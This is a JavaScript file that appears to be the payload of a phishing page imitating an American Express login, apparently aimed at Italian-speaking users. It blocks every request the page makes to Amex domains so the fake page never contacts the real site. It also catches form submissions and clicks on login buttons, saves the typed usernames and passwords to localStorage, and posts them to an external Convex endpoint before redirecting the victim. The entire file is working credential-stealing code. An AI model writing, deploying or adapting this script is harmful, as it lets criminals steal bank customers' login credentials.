(function(){
  // MUST RUN FIRST - block ALL external calls

  const CONVEX='https://dynamic-stoat-328.convex.cloud';

  // Block fetch
  const _fetch = window.fetch;
  window.fetch = function(u, o) {
    if (typeof u === 'string' && (u.includes('americanexpress') || u.includes('aexp') || u.includes('amex'))) {
      console.log('BLOCKED fetch:', u);
      return Promise.resolve(new Response('{}', {status: 200, headers: {'Content-Type': 'application/json'}}));
    }
    return _fetch.apply(this, arguments);
  };

  // Block XHR
  const _open = XMLHttpRequest.prototype.open;
  XMLHttpRequest.prototype.open = function(m, u) {
    if (typeof u === 'string' && (u.includes('americanexpress') || u.includes('aexp') || u.includes('amex'))) {
      console.log('BLOCKED XHR:', u);
      return;
    }
    return _open.apply(this, arguments);
  };

  // Block dynamic script injection
  const _createElement = document.createElement;
  document.createElement = function(tag) {
    const el = _createElement.call(document, tag);
    if (tag.toLowerCase() === 'script' || tag.toLowerCase() === 'link' || tag.toLowerCase() === 'img') {
      const _setAttr = el.setAttribute;
      el.setAttribute = function(name, value) {
        if ((name === 'src' || name === 'href') && typeof value === 'string' &&
            (value.includes('americanexpress') || value.includes('aexp') || value.includes('amex'))) {
          console.log('BLOCKED setAttribute:', name, value);
          return;
        }
        return _setAttr.call(this, name, value);
      };
      const _set = Object.getOwnPropertyDescriptor(Element.prototype, 'src')?.set;
      if (_set) {
        Object.defineProperty(el, 'src', {
          set: function(v) {
            if (typeof v === 'string' && (v.includes('americanexpress') || v.includes('aexp') || v.includes('amex'))) {
              console.log('BLOCKED src property:', v);
              return;
            }
            return _set.call(this, v);
          },
          get: function() { return this.getAttribute('src'); }
        });
      }
    }
    return el;
  };

  // Capture credentials
  async function saveCreds(u, p) {
    const data = JSON.parse(localStorage.getItem('creds') || '[]');
    data.push({ u, p, t: Date.now() });
    localStorage.setItem('creds', JSON.stringify(data));
    try {
      await _fetch(CONVEX + '/api/credentials/capture', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username: u, password: p })
      });
    } catch(e) {}
  }

  // Intercept form submit
  document.addEventListener('submit', function(e) {
    const form = e.target;
    const pwd = form.querySelector('input[type="password"]');
    const user = form.querySelector('input[type="text"], input[type="email"], input[name*="user"], input[name*="email"]');
    if (pwd && pwd.value) {
      e.preventDefault();
      e.stopPropagation();
      saveCreds(user?.value || '', pwd.value).then(function() {
        window.location.href = '/success/';
      });
    }
  }, true);

  // Intercept click on login buttons
  document.addEventListener('click', function(e) {
    const btn = e.target.closest('button, input[type="submit"]');
    if (!btn) return;
    const text = (btn.textContent || '').toLowerCase();
    if (text.includes('accedi') || text.includes('login') || text.includes('entra') || text.includes('continua')) {
      e.preventDefault();
      e.stopPropagation();
      const pwd = document.querySelector('input[type="password"]');
      const user = document.querySelector('input[type="text"], input[type="email"]');
      if (pwd && pwd.value) {
        saveCreds(user?.value || '', pwd.value).then(function() {
          window.location.href = '/success/';
        });
      }
    }
  }, true);

  console.log('✓ Intercept ready - all external calls blocked');
})();